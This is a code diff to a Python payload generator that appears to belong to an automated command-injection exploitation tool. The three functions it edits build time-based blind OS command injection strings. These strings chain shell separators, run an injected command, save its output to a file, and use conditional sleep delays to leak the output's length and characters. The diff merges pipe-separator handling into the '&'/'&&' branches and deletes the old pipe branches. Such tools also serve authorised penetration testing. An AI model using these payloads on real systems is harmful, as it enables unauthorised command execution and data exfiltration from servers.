@@ -97,7 +97,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                 "sleep $((" + str(timesec) + "*(" + str(j) + "==${" + settings.RANDOM_VAR_GENERATOR + "1})))"
                 )
-    elif separator in ("&", "&&") and checks.substitution_nests():
+    elif separator in ("&", "&&", settings.PIPE_SEPARATOR) and checks.substitution_nests():
       # The write leaves no output of its own, so the read right after it reads as one word -
       # which sequences the two without an operator between them.
       payload = separator + tb_payloads._timed_comparison(timesec, j,
@@ -124,12 +124,6 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
                 )
       
 
-    elif separator in ("|", "||") and checks.substitution_nests():
-      pipe = "|"
-      payload = (pipe +
-                "[ " + str(j) + " -ne $(printf '%s' \"" + TAG + "\"" + pipe + "tee " + OUTPUT_TEXTFILE + pipe + "wc -c) ]" + "||" +
-                "sleep " + str(timesec)
-                )
     else:
       pass
 
@@ -218,7 +212,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "od -A n -t u1 <" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 "echo $" + settings.RANDOM_VAR_GENERATOR + "1 >" + OUTPUT_TEXTFILE
                 )
-    elif separator in ("&", "&&") and checks.substitution_nests():
+    elif separator in ("&", "&&", settings.PIPE_SEPARATOR) and checks.substitution_nests():
       arith_operator = "<=" if operator == "-le" else "=="
       # Every step is a substitution inside the one command, and they are expanded left to right:
       # the command runs, the file is flattened back over itself, the length is read off it, and
@@ -264,14 +258,6 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 "echo $" + settings.RANDOM_VAR_GENERATOR + "1" + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE
                 )
 
-    elif separator in ("|", "||") and checks.substitution_nests():
-      pipe = "|"
-      cmd = cmd.rstrip()
-      cmd = checks.add_command_substitution(cmd)
-      payload = (pipe +
-                "[ " + str(j) + settings.SINGLE_WHITESPACE + inverted_operator + " $(" + cmd + pipe + "tee " + OUTPUT_TEXTFILE + pipe + "wc -c) ]" + "||" +
-                "sleep " + str(timesec)
-                )
     else:
       pass
 
@@ -356,7 +342,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "awk '{print$" + str(num_of_chars) + "}' <" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 "sleep $((" + str(timesec) + "*(" + str(ascii_char) + arith_operator + settings.RANDOM_VAR_GENERATOR + ")))"
                 )
-    elif separator in ("&", "&&") and checks.substitution_nests():
+    elif separator in ("&", "&&", settings.PIPE_SEPARATOR) and checks.substitution_nests():
       payload = separator + tb_payloads._timed_comparison(timesec, ascii_char,
                   settings.CMD_SUB_PREFIX + "awk '{print$" + str(num_of_chars) + "}' <" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX, arith_operator)
     elif separator == "&&" :
@@ -372,12 +358,6 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
     elif separator == "&":
       payload = (separator +
                 "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + " $(awk '{print$" + str(num_of_chars) + "}' <" + OUTPUT_TEXTFILE + ") ]" + "&&" +
-                "sleep " + str(timesec)
-                )
-    elif separator in ("|", "||") and checks.substitution_nests():
-      pipe = "|"
-      payload = (pipe +
-                "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + inverted_operator + " " + checks.byte_ordinal("$(cut -b" + str(num_of_chars) + " " + OUTPUT_TEXTFILE + ")") + " ]" + "||" +
                 "sleep " + str(timesec)
                 )
     else:
